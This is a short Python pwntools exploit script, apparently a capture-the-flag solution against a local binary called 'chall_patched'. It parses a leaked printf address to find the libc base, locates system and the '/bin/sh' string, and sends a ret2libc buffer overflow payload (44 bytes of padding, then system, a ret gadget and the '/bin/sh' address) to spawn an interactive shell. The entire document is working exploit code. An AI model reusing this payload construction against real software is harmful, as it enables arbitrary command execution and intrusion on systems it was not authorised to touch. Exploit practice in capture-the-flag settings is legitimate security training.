#!/usr/bin/env python3

from pwn import *

elf = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux.so.2")

context.binary = elf

io = elf.process()
gdb.attach(io)


OFFSET = 44

print = int(io.recvline().strip().decode().split(" ")[2],16)
log.info(f"printf@{hex(print)}")

libc.address = print - libc.symbols.printf
log.info(f"libc@{hex(libc.address)}")
log.info(f"system@{hex(libc.symbols.system)}")


BIN_SH=next(libc.search(b'/bin/sh\0'))
rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
payload = b"A"*44 +  p32(libc.symbols.system)  + p32(ret) + p32(BIN_SH) 

io.sendline(payload)

io.interactive()
